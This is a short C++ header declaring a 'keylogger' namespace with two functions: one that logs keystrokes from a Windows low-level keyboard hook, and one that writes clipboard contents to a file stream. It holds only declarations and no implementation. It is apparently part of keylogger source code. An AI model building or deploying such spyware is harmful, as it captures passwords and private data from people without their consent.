#pragma once

#include <Windows.h>
#include <fstream>

namespace keylogger
{
	void log_kbd(const KBDLLHOOKSTRUCT* kbd_hook);

	void write_clipboard_data(std::wofstream& stream);
};